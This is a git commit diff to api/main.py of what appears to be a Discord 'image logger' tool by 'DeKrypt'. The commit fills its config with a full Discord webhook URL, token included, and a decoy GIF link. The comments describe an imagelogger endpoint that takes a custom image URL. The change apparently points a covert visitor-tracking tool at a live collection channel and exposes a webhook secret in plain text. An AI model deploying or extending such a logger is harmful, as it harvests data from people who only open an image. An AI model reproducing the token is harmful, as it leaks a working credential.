fa064052721e3aa34a92dda4420d973fdcd0722d
R3lex <dogusturken12@gmail.com>
2025-05-22 03:50:14 +0300

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1374911954145116231/XR_jDGA9q5ksGkSJfJy5MwI-eYolTqMXqdAfjuUEPtFO_lXx6mlpSfcdf3uqa6D8Ed7A",
+    "image": "https://tenor.com/view/sesegel-hasan-hasan-mustan-gif-21196655", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
